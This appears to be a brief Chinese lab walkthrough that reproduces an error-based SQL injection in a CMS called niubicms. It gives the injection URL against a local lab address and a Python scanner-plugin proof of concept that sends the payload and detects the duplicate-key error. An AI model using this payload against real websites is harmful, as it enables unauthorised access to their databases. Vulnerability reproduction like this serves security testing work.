# 实战
在浏览器输入
```
http://IP:PORT/install/
```
## 安装

![image]({path}/1.png)

![image]({path}/2.png)

![image]({path}/3.png)





## 攻击实战


在浏览器输入
```
http://192.168.1.170:7777/wap/?action=show&mod=admin%20where%20userid=1%20and%20(select%201%20from%20(select%20count(*),concat(1,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)--
```

攻击的payload


```
def assign(service,arg):
    if service == "niubicms":
    	return True, arg

def audit(arg):
	payload = "/wap/?action=show&mod=admin%20where%20userid=1%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%281,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29--"
	code, head, res, errcode,finalurl =  curl.curl("\"%s\"" % (arg + payload))

	if code == 200:
		if "for key 'group_key'" in res:
			security_hole('find sql injection: ' + arg+payload)

if __name__ == "__main__":
	from dummy import *
	audit(assign('niubicms', 'http://www.example.com/')[1])
```

![image]({path}/4.png)
